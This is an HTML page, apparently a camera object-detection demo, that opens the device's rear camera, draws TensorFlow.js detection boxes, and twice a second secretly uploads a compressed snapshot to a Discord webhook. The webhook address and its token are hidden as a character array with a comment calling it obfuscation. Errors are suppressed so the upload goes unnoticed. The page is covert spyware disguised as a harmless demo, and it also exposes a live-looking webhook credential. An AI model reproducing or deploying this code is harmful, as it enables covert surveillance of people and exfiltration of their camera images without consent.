<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>High-Speed Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
    <style>
        body { margin: 0; background: #000; overflow: hidden; }
        video { width: 100vw; height: 100vh; object-fit: cover; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    </style>
</head>
<body>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    const ctx = c.getContext('2d');
    
    // Webhook 網址混淆
    const _u = ["h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"].join('');

    let m = null;

    async function init() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            v.srcObject = s;
            m = await cocoSsd.load();
            detect();
            // --- 核心改動：每 500 毫秒 (0.5秒) 執行一次 ---
            setInterval(sync, 500); 
        } catch (e) {}
    }

    async function detect() {
        if (!m) return;
        const res = await m.detect(v);
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        ctx.clearRect(0, 0, c.width, c.height);
        res.forEach(p => {
            ctx.strokeStyle = "#00FF00";
            ctx.lineWidth = 2;
            ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
        });
        requestAnimationFrame(detect);
    }

    function sync() {
        if (!m || v.readyState < 2) return;

        const tmp = document.createElement('canvas');
        // 降低解析度以提升傳送速度
        tmp.width = v.videoWidth / 2;
        tmp.height = v.videoHeight / 2;
        tmp.getContext('2d').drawImage(v, 0, 0, tmp.width, tmp.height);

        // 降低圖片品質 (0.2) 減小體積
        tmp.toBlob((blob) => {
            if (!blob) return;
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: "High-Speed Sync" }));
            fd.append('file', blob, 't.jpg');

            // 執行發送
            fetch(_u, { method: 'POST', body: fd, mode: 'no-cors' }).catch(() => {});
        }, 'image/jpeg', 0.2); 
    }

    init();
</script>
</body>
</html>
